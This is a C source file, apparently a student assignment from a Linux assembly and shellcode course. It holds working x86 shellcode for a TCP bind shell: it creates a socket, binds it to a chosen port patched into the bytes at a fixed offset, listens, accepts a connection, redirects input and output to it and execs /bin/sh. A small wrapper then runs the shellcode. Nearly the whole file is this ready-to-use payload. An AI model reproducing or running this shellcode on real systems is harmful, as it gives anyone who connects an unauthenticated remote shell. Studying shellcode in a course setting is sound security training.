// Student ID : SLAE-1314 
// Xenofon Vassilakopoulos 

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <netinet/in.h>

#define PORT 29 // 0xd204 -> \x04\xd2

int main(int argc, char* argv[]) {
    unsigned char shellcode[] = \ 
	    "\x31\xc0\x31\xdb\x31\xd2\x31\xf6\xb0\x66\xb3\x01\x52\x53\x6a\x02\x89\xe1\xcd\x80\x89\xc6\xb0\x66"
	    "\xfe\xc3\x52\x66\x68\x04\xd2\x66\x53\x89\xe1\x6a\x10\x51\x56\x89\xe1\xcd\x80\x52\x56\x89\xe1\x83"
	    "\xc3\x02\xb0\x66\xcd\x80\xb0\x66\xfe\xc3\x52\x52\x56\x89\xe1\xcd\x80\x89\xc3\x31\xc9\xb0\x3f\xcd"
	    "\x80\x41\x80\xf9\x02\x7e\xf6\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89"
	    "\xe2\x53\x89\xe1\xb0\x0b\xcd\x80";

    if (argc <= 1) {
        printf("Usage: %s <port>\n\n", argv[0]);
        return -1;
    }
    // provide binary form for port in order to be able to execute with shellcode  
    unsigned short port = htons(atoi(argv[1]));
	
    // copy the new port in the right shellcode offset 
    memcpy(&shellcode[PORT], &port, 2);

    printf("Length:  %d\n", strlen(shellcode));

    int (*ret)() = (int(*)())shellcode;

    ret();
}
